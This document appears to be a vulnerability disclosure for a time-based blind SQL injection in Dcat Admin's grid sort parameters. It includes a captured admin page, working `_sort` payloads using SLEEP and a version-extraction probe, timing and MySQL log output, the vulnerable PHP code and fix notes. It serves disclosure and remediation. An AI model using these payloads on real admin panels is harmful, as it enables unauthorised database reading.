href="http://127.0.0.1:23902/admin/auth/users?_sort%5Bcolumn%5D=id&amp;_sort%5Btype%5D=ASC%2C%28SELECT%28SLEEP%283%29%29%29&amp;_sort%5Bcast%5D=SIGNED&amp;per_page=200">200</a></li></ul>
    </span>
</label>
    </div>


</div>
</div></div>

    
        
        
    </div>

    <script data-exec-on-popstate>
(function () {
    try {
        
    } catch (e) {
        console.error(e)
    }
})();
Dcat.ready(function () {
    try {
        Dcat.token = "jRm6LZ0qE5GMk5UhqBAAO1SN9HOfVFz5GrXVJsFH";;
var selector = Dcat.RowSelector({
    checkboxSelector: '.grid-row-checkbox',
    selectAllSelector: '.grid-select-all', 
    clickRow: false,
    background: '#f6fbff',
});
Dcat.grid.addSelector(selector, '');;
(function () {window.resolveDialogTree = function (options) {
        var tpl = $('#dialog-tree-tpl').html(),
            t = $(this),
            val = t.data('val'),
            url = t.data('url'),
            title = t.data('title'),
            ckall = t.data('checked'),
            idx,
            loading;

        val = val ? String(val).split(',') : [];

        if (url) {
            if (loading) return;
            loading = 1;

            t.buttonLoading();
            $.ajax(url, {data: {value: val}}).then(function (resp) {
                loading = 0;
                t.buttonLoading(false);

                if (!resp.status) {
                    return Dcat.error(resp.message || '系统繁忙，请稍后再试');
                }

                open(resp.value);
            });
        } else {
            open(val);
        }

        function open(val) {
            options.config.core.data = formatNodes(val, options.nodes);

            idx = layer.open({
                type: 1,
                area: options.area,
                content: tpl,
                title: title,
                success: function (a, idx) {
                    var tree = $('#layui-layer'+idx).find('.da-tree');

                    tree.on("loaded.jstree", function () {
                        tree.jstree('open_all');
                    }).jstree(options.config);
                }
            });

            $(document).one('pjax:complete', function () {
                layer.close(idx);
            });
        }

        function formatNodes(value, all) {
            var idColumn = options.columns.id,
                textColumn = options.columns.text,
                parentColumn = options.columns.parent,
                nodes = [], i, v, parentId;

            for (i in all) {
                v = all[i];
                if (!v[idColumn]) continue;

                parentId = v[parentColumn] || '#';
                if (!parentId || parentId == options.rootParentId || parentId == '0') {
                    parentId = '#';
                }

                v['state'] = {'disabled': true};

                if (ckall || (value && Dcat.helpers.inObject(value, v[idColumn]))) {
                    v['state']['selected'] = true;
                }

                nodes.push({
                    'id'     : v[idColumn],
                    'text'   : v[textColumn] || null,
                    'parent' : parentId,
                    'state'  : v['state'],
                });
            }

            return nodes;
        }
    }
})();;
(function () {var nodes = [{"id":1,"name":"Auth management","slug":"auth-management","http_method":[],"http_path":[""],"order":1,"parent_id":0,"created_at":"2026-11-02 13:40:21","updated_at":null},{"id":2,"name":"Users","slug":"users","http_method":[],"http_path":["\/auth\/users*"],"order":2,"parent_id":1,"created_at":"2026-11-02 13:40:21","updated_at":null},{"id":3,"name":"Roles","slug":"roles","http_method":[],"http_path":["\/auth\/roles*"],"order":3,"parent_id":1,"created_at":"2026-11-02 13:40:21","updated_at":null},{"id":4,"name":"Permissions","slug":"permissions","http_method":[],"http_path":["\/auth\/permissions*"],"order":4,"parent_id":1,"created_at":"2026-11-02 13:40:21","updated_at":null},{"id":5,"name":"Menu","slug":"menu","http_method":[],"http_path":["\/auth\/menu*"],"order":5,"parent_id":1,"created_at":"2026-11-02 13:40:21","updated_at":null},{"id":6,"name":"Extension","slug":"extension","http_method":[],"http_path":["\/auth\/extensions*"],"order":6,"parent_id":1,"created_at":"2026-11-02 13:40:21","updated_at":null}];
    var options = {"plugins":["checkbox","types"],"core":{"check_callback":true,"themes":{"name":"proton","responsive":true}},"checkbox":{"keep_selected_style":false},"types":{"default":{"icon":false}}};
    var area = ["580px","600px"];

    $('.grid-dialog-tree').off('click').on('click', function () {
        resolveDialogTree.call(this, {config: options, nodes: nodes, area: area, rootParentId: '0', columns: {"id":"id","text":"name","parent":"parent_id"}});
    });
})();;
(function () {
    var opts = {"title":"Edit","area":["700px","670px"],"defaultUrl":null,"buttonSelector":".quick-edit","query":"_dialog_form_","lang":{"submit":"Submit","reset":"Reset"},"forceRefresh":true,"resetButton":true};

    opts.success = function (success, response) {
        Dcat.reload()
    };
    opts.error = function (success, response) {
        
    };
    opts.saved = function (success, response) {
        
    };

    Dcat.DialogForm(opts);
})();;
(function () {Dcat.init('.grid-row-checkbox', function ($this) {
    $this.on('change', function () {
        var btn = $('.grid-select-all-btn'), selected = Dcat.grid.selectedRows('').length;

        if (selected) {
            btn.show()
        } else {
            btn.hide()
        }
        setTimeout(function () {
            btn.find('.selected').html("{n} items selected".replace('{n}', selected));
        }, 50)
    })
})
})();;
(function () {
    var inputting = false,
        $ipt = $('input.quick-search-input'),
        val = $ipt.val(),
        ignoreKeys = [16, 17, 18, 20, 35, 36, 37, 38, 39, 40, 45, 144],
        auto = $ipt.attr('auto');

    var submit = Dcat.helpers.debounce(function (input) {
        inputting || $(input).parents('form').submit()
    }, 1200);

    function toggleBtn() {
        var t = $(this),
            btn = t.parent().parent().find('.quick-search-clear');

        if (t.val()) {
            btn.css({color: '#333', cursor: 'pointer'});
        } else {
            btn.css({color: '#fff', cursor: 'none'});
        }
        return false;
    }

    $ipt.on('focus', toggleBtn)
        .on('mousemove', toggleBtn)
        .on('mouseout', toggleBtn)
        .on('compositionstart', function(){
            inputting = true
        })
        .on('compositionend', function() {
            inputting = false
        });

    if (auto > 0) {
        $ipt.on('keyup', function (e) {
            toggleBtn.apply(this);

            ignoreKeys.indexOf(e.keyCode) == -1 && submit(this)
        })
    }

    val !== '' && $ipt.val('').focus().val(val);

    $('.quick-search-clear').on('click', function () {
        $(this).parent().find('.quick-search-input').val('');

        $(this).closest('form').submit();
    });
})();
(function () {$('.column-selector input[name="_all_"]').on('change', function () {
        $(this).parents('.column-selector').find('.column-select-item').prop('checked', this.checked).change()
    });

    var submit = Dcat.helpers.debounce(function ($this) {
        var defaults = ["__row_selector__","id","username","name","roles","permissions","created_at","updated_at","__actions__"];
        var selected = [];
        var $parent = $this.parents('.column-selector');
        var column = '_columns_'

        $parent.find('.column-select-item:checked').each(function () {
            selected.push($(this).val());
        });

        if (selected.length == 0) {
            return;
        }

        var url = new URL(location);

        if (selected.sort().toString() == defaults.sort().toString()) {
            url.searchParams.set(column, '');
        } else {
            url.searchParams.set(column, selected.join());
        }

        Dcat.reload(url.toString());
    }, 200);

    $('.column-selector .column-select-item').on('change', function () {
        submit($(this));
    });
})();;
(function () {
    var opts = {"title":"New","area":["700px","670px"],"defaultUrl":null,"buttonSelector":".dialog-create","query":"_dialog_form_","lang":{"submit":"Submit","reset":"Reset"},"forceRefresh":false,"resetButton":true};

    opts.success = function (success, response) {
        Dcat.reload()
    };
    opts.error = function (success, response) {
        
    };
    opts.saved = function (success, response) {
        
    };

    Dcat.DialogForm(opts);
})();;
$('.grid-per-page').change(function() {
    Dcat.reload(this.value);
});
    } catch (e) {
        console.error(e)
    }
})
</script>
    <div class="extra-html">
    <template id="dialog-tree-tpl">
        <div class="jstree-wrapper p-1" style="border:0"><div class="da-tree" style="margin-top:10px"></div></div>
    </template>
</div>
        </div>
    </div>
</div>

<footer class="main-footer pt-1">
    <p class="clearfix blue-grey lighten-2 mb-0 text-center">
            <span class="text-center d-block d-md-inline-block mt-25">
                Powered by
                <a target="_blank" href="https://github.com/jqhph/dcat-admin">Dcat Admin</a>
                <span>&nbsp;·&nbsp;</span>
                v2.2.2-beta
            </span>

        <button class="btn btn-primary btn-icon scroll-top pull-right" style="position: fixed;bottom: 2%; right: 10px;display: none">
            <i class="feather icon-arrow-up"></i>
        </button>
    </p>
</footer>



<script src="http://127.0.0.1:23902/vendor/dcat-admin/adminlte/adminlte.js?v2.2.2-beta"></script><script src="http://127.0.0.1:23902/vendor/dcat-admin/dcat/plugins/extensions/toastr.min.js?v2.2.2-beta"></script><script src="http://127.0.0.1:23902/vendor/dcat-admin/dcat/plugins/jquery-pjax/jquery.pjax.min.js?v2.2.2-beta"></script><script src="http://127.0.0.1:23902/vendor/dcat-admin/dcat/plugins/bootstrap-validator/validator.min.js?v2.2.2-beta"></script><script src="http://127.0.0.1:23902/vendor/dcat-admin/dcat/plugins/layer/layer.js?v2.2.2-beta"></script><script src="http://127.0.0.1:23902/vendor/dcat-admin/dcat/plugins/jquery.initialize/jquery.initialize.min.js?v2.2.2-beta"></script><script src="http://127.0.0.1:23902/vendor/dcat-admin/dcat/plugins/jstree-theme/jstree.min.js?v2.2.2-beta"></script>

<script>Dcat.boot();</script>

</body>

</html>
```

Verification result notes:

- Baseline `_sort[column]=id&_sort[type]=asc`: HTTP 200 in ~0.02s (baseline `0.021840`).
- Exploit with `_sort[cast]=SIGNED` and `_sort[type]=ASC,(SELECT(SLEEP(3)))`: HTTP 200 in ~3.03s (`3.025534`).
- MySQL general_log: `select * from \`admin_users\` order by CAST(\`id\` AS SIGNED) ASC,(SELECT(SLEEP(3))) limit 20 offset 0`.
- Blind version nibble: `IF(SUBSTR(VERSION(),1,1)='8',SLEEP(2),0)` ≈2.03s; `'9'` ≈0.02s (lab MySQL 8.0).

Measured timing and general_log:

```text
=== Timing proof ===
baseline: 0.021840
exploit SLEEP(3): 3.025534

=== MySQL general_log proving injection ===
2026-11-02 13:41:26.308517	SELECT event_time, argument FROM mysql.general_log WHERE argument LIKE '%SLEEP%' ORDER BY event_time DESC LIMIT 10
2026-11-02 13:41:23.239040	select * from `admin_users` order by CAST(`id` AS SIGNED) ASC,(SELECT(SLEEP(3))) limit 20 offset 0
2026-11-02 13:41:23.238961	select * from `admin_users` order by CAST(`id` AS SIGNED) ASC,(SELECT(SLEEP(3))) limit 20 offset 0
2026-11-02 13:41:20.162916	select * from `admin_users` order by CAST(`id` AS SIGNED) ASC,(SELECT(SLEEP(3))) limit 20 offset 0
2026-11-02 13:41:20.162816	select * from `admin_users` order by CAST(`id` AS SIGNED) ASC,(SELECT(SLEEP(3))) limit 20 offset 0
2026-11-02 13:40:52.688016	SELECT argument FROM mysql.general_log WHERE argument LIKE '%order by%' OR argument LIKE '%ORDER BY%' OR argument LIKE '%SLEEP%' ORDER BY event_time DESC LIMIT 20
2026-11-02 13:40:49.614092	select * from `admin_users` order by CAST(`id` AS SIGNED) ASC,(SELECT(SLEEP(2))) limit 20 offset 0
2026-11-02 13:40:49.613972	select * from `admin_users` order by CAST(`id` AS SIGNED) ASC,(SELECT(SLEEP(2))) limit 20 offset 0
```

### Vulnerability analysis

Dcat Admin grid sorting accepts the `_sort` query object from the client without an allowlist. `Grid\Model::getSort()` returns `column`, `type`, and optional `cast` directly from the request. For Eloquent-backed grids, `EloquentRepository::setSort` → `setOrderBy` switches to `orderByRaw` whenever `cast` is non-empty and interpolates both `cast` and `type` into the raw SQL fragment:

`CAST({column} AS {cast}) {type}`

An authenticated attacker can therefore append arbitrary SQL after the sort direction (e.g. `, (SELECT(SLEEP(3)))`) or break out of the CAST type. Built-in admin resources (`/admin/auth/users`, `/admin/auth/roles`) enable `sortable()` on `id` / `updated_at`, so no custom app code is required. Impact is time-based (and boolean/error-based) blind SQL injection against the application database, including reading other schemas reachable by the DB user.

Trigger / sink source (full path and line numbers):

```php
# File: src/Grid/Model.php
# Lines: 586-597
    public function getSort()
    {
        if (empty($this->sort)) {
            $this->sort = $this->request->get($this->getSortName());
        }

        if (empty($this->sort['column']) || empty($this->sort['type'])) {
            return [null, null, null];
        }

        return [$this->sort['column'], $this->sort['type'], $this->sort['cast'] ?? null];
    }
```

```php
# File: src/Repositories/EloquentRepository.php
# Lines: 178-201
    protected function setSort(Grid\Model $model)
    {
        [$column, $type, $cast] = $model->getSort();

        if (empty($column) || empty($type)) {
            $orders = $model->getSortQueries();

            $model->resetOrderBy();

            $orders->each(function ($orderBy) use ($model) {
                $column = $orderBy['arguments'][0];
                $type = in_array($orderBy['method'], $model->getSortDescMethods(), true) ? 'desc' : ($orderBy['arguments'][1] ?? 'asc');
                $cast = null;

                $this->addOrderBy($model, $column, $type, $cast);
            });

            return;
        }

        $model->resetOrderBy();

        $this->addOrderBy($model, $column, $type, $cast);
    }
```

```php
# File: src/Repositories/EloquentRepository.php
# Lines: 235-263
    protected function setOrderBy(Grid\Model $model, $column, $type, $cast)
    {
        $isJsonColumn = Str::contains($column, '->');

        if ($isJsonColumn) {
            $explodedCols = explode('->', $column);
            // json字段排序
            $col = $this->wrapMySqlColumn(array_shift($explodedCols));
            $parts = implode('.', $explodedCols);
            $column = "JSON_UNQUOTE(JSON_EXTRACT({$col}, '$.{$parts}'))";
        }

        if (! empty($cast)) {
            $column = $this->wrapMySqlColumn($column);

            $model->addQuery(
                'orderByRaw',
                ["CAST({$column} AS {$cast}) {$type}"]
            );

            return;
        }

        if ($isJsonColumn) {
            $model->addQuery('orderByRaw', ["{$column} {$type}"]);
        } else {
            $model->addQuery('orderBy', [$column, $type]);
        }
    }
```


### Fix notes

- Do not pass request-controlled `type` / `cast` into `orderByRaw`.
- Allowlist sort columns to those registered via `sortable()`; allowlist direction to `asc`/`desc` only.
- If CAST is required, allowlist cast types (e.g. `SIGNED`, `DECIMAL`, `CHAR`) server-side; never echo client `cast` into SQL.
- Prefer query builder `orderBy` with validated identifiers; avoid string concatenation for ORDER BY.
